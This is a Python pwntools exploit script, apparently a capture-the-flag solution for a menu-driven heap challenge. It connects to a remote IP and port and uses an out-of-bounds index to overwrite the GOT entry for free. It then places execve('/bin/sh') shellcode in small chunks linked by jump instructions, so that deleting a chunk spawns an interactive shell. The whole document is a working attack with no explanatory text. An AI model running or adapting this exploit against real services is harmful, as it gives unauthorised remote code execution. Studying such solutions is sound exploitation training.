from pwn import *
context(arch='amd64',os='linux',log_level='debug')
p=remote('159.138.137.79',58224)
elf=ELF('./pwn')
def create(index,context):
    p.sendlineafter('your choice>> ','1')
    p.sendlineafter('index:',str(index))
    p.sendlineafter('size:','8')
    p.sendlineafter('content:',context)
def delete(index):
    p.sendlineafter('your choice>> ','4')
    p.sendlineafter('index:',str(index))
code0=asm('xor rax,rax')+'\x90\x90\xeb\x19'
code1=asm('mov eax,0x3B')+'\xeb\x19'
code2=asm('xor rsi,rsi')+'\x90\x90\xeb\x19'
code3=asm('xor rdx,rdx')+'\x90\x90\xeb\x19'
code4=asm('syscall').ljust(7,'\x90')

create(0,'/bin/sh')
create((elf.got['free']-0x2020a0)/8,code0)
create(1,code1)
create(2,code2)
create(3,code3)
create(4,code4)
delete(0)
p.interactive()
